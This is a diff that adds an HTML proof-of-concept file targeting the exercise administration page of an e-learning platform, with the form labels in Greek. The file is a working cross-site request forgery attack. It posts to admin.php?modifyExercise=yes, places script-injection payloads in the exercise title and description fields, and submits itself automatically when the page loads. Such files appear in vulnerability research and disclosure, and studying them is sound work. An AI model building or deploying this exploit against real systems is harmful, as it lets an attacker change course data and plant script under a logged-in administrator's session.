@@ -1,0 +1,43 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/exercice/admin.php?modifyExercise=yes' method='post'>
+<table width='99%' class='FormData'><tbody><tr><th class="left" width="220">&nbsp;</th>
+	<td><b>Στοιχεία άσκησης</b></td></tr>
+	<tr><th class="left">Όνομα Άσκησης :</th>
+	<td><input type="text" name="exerciseTitle" value="<script>alert('xss')</script>" size="50" maxlength="200" value="" style="width:400px;" class="FormData_InputText"></td>
+	</tr><tr><th class='left'>Περιγραφή Άσκησης :</th>
+	<td><textarea wrap='virtual' name='exerciseDescription' value="<script>alert('xss')</script>" cols='50' rows='4' style='width:400px;' class='FormData_InputText'></textarea></td>
+	</tr><tr><th class="left">Τύπος Ασκήσεων :</th>
+	<td><input type='radio' name='exerciseType' value='1' checked='checked'> Σε μία μόνο σελίδα
+	<br>
+	<input type='radio' name='exerciseType' value='2'> Σε μία ερώτηση ανά σελίδα (στη σειρά)</td>
+	</tr><tr><th class="left">Έναρξη :</th>
+	<td><input style="width: 15em; color: #840; background-color: #fff; border: 1px dotted #000; text-align: center" name="exerciseStartDate" value="2018-04-18" id="f-calendar-field-1" type="text" /><a href="#" id="f-calendar-trigger-1"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%Y-%m-%d","daFormat": "%Y/%m/%d","showsTime":false,"showOthers":true,"inputField": "f-calendar-field-1","button": "f-calendar-trigger-1"});</script></td></tr><th class="left">Λήξη :</th>
+	<td><input style="width: 15em; color: #840; background-color: #fff; border: 1px dotted #000; text-align: center" name="exerciseEndDate" value="2019-04-18" id="f-calendar-field-2" type="text" /><a href="#" id="f-calendar-trigger-2"><img align="middle" border="0" src="http://eponymous.csec.gr/include/jscalendar/img.gif" alt="" /></a><script type="text/javascript">Calendar.setup({"ifFormat": "%Y-%m-%d","daFormat": "%Y/%m/%d","showsTime":false,"showOthers":true,"inputField": "f-calendar-field-2","button": "f-calendar-trigger-2"});</script></td>
+	</tr><tr>
+	<th class="left">Χρονικός περιορισμός :</th>
+	<td><input type="text" name="exerciseTimeConstrain" size="3" maxlength="3" value="0" class="FormData_InputText">&nbsp;&nbsp;λεπτά &nbsp;&nbsp;&nbsp;&nbsp;(0 για καθόλου περιορισμό)</td>
+	</tr><tr>
+	<th class="left">Επιτρεπόμενες επαναλήψεις :</th>
+	<td><input type="text" name="exerciseAttemptsAllowed" size="3" maxlength="2"value="0" class="FormData_InputText">&nbsp;&nbsp;φορές &nbsp;&nbsp;&nbsp;(0 για απεριόριστο αριθμό επαναλήψεων)</td>
+	</tr><tr>
+	<th class='left'>Απαντήσεις :</th>
+	<td><input type='radio' name='dispresults' value='1'checked>&nbsp;Εμφάνιση απαντήσεων μετά το τέλος της άσκησης
+	<br><input type='radio' name='dispresults' value='0'>&nbsp;Απόκρυψη απαντήσεων μετά το τέλος της άσκησης
+	</td>
+	</tr><tr>
+	<th class='left'>Βαθμολογία :</th>
+	<td><input type='radio' name='dispscore' value='1'checked>&nbsp;Εμφάνιση βαθμολογίας μετά το τέλος της άσκησης
+	<br><input type='radio' name='dispscore' value='0'>&nbsp;Απόκρυψη βαθμολογίας μετά το τέλος της άσκησης
+	</td>
+	</tr><tr><th class='left'>&nbsp;</th>
+	<td><input type='text' name='submitExercise' value='Δημιουργία'>&nbsp;&nbsp;
+	<input type='submit' name='cancelExercise' value='Ακύρωση'></td>
+	</tr></tbody></table>
+
+
+  <td><input class='FormData_InputText' type='text' name='submit' value='submit'></td>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
